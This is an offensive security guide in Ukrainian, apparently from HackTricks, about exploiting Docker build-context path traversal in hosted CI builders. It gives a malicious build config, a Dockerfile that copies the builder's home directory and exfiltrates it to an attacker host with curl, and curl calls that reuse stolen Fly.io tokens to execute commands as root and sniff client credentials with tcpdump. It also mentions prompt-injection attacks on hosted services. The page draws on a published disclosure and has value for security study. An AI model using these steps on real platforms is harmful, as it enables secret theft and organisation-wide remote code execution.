# Зловживання Docker Build Context у Hosted Builders (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

Якщо платформа CI/CD або hosted builder дозволяє контриб’юторам вказувати шлях Docker build context та шлях до Dockerfile, часто можна встановити context на батьківський каталог (наприклад, "..") і зробити файли хоста частиною build context. Тоді Dockerfile, контрольований нападником, може використовувати COPY та exfiltrate секрети, знайдені в домашньому каталозі користувача билдера (наприклад, ~/.docker/config.json). Вкрадені registry tokens також можуть працювати проти control-plane APIs провайдера, дозволяючи org-wide RCE.

## Attack surface

Багато hosted builder/registry сервісів роблять приблизно таке під час збірки образів, наданих користувачами:
- Читають конфіг репозиторію, який містить:
- build context path (відправляється до Docker daemon)
- Dockerfile path відносно цього context
- Копіюють вказаний каталог build context і Dockerfile до Docker daemon
- Збирають образ і запускають його як hosted service

Якщо платформа не канонізує і не обмежує build context, користувач може встановити його в локацію за межами репозиторію (path traversal), через що будь-які файли хоста, доступні для читання користувачу билдера, стануть частиною build context і доступні для COPY у Dockerfile.

Практичні обмеження, що часто спостерігаються:
- Dockerfile повинен знаходитися в межах обраного context path і його шлях має бути відомий заздалегідь.
- У білдер-користувача повинен бути доступ на читання до файлів, включених у context; спеціальні device файли можуть порушити копіювання.

## PoC: Path traversal via Docker build context

Example malicious server config declaring a Dockerfile within the parent directory context:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Примітки:
- Використання ".." часто вказує на домашню директорію користувача builder (наприклад, /home/builder), яка зазвичай містить чутливі файли.
- Помістіть ваш Dockerfile у директорію з іменем repo (наприклад, repo "test" → test/Dockerfile), щоб він залишався в межах розгорнутого батьківського контексту.

## PoC: Dockerfile для збирання та ексфільтрації контексту хоста
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Цілі, які зазвичай відновлюються з $HOME:
- ~/.docker/config.json (облікові дані/токени реєстру)
- Інші кеші та конфігурації cloud/CLI (наприклад, ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Порада: Навіть якщо в репозиторії є .dockerignore, вразливий механізм вибору контексту на стороні платформи все одно визначає, що надсилається демону. Якщо платформа копіює обраний шлях до демона перед оцінкою repo’s .dockerignore, файли хоста все ще можуть бути скомпрометовані.

## Cloud pivot with overprivileged tokens (example: Fly.io Machines API)

Деякі платформи видають один bearer token, який можна використовувати як для container registry, так і для control-plane API. Якщо ви exfiltrate registry token, спробуйте застосувати його до provider API.

Приклади викликів API до Fly.io Machines API з використанням вкраденого токена з ~/.docker/config.json:

Перерахувати додатки в організації:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Запустити команду як root у будь-якій машині додатку:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Результат: на рівні організації remote code execution у всіх hosted apps, де token має достатні привілеї.

## Викрадення Secret з скомпрометованих hosted services

Отримавши exec/RCE на hosted серверах, ви можете збирати client-supplied secrets (API keys, tokens) або ініціювати prompt-injection атаки. Наприклад: встановіть tcpdump і захопіть HTTP-трафік на port 8080, щоб витягти inbound credentials.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Перехоплені запити часто містять клієнтські облікові дані в заголовках, у тілі або в параметрах запиту.

## Посилання

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
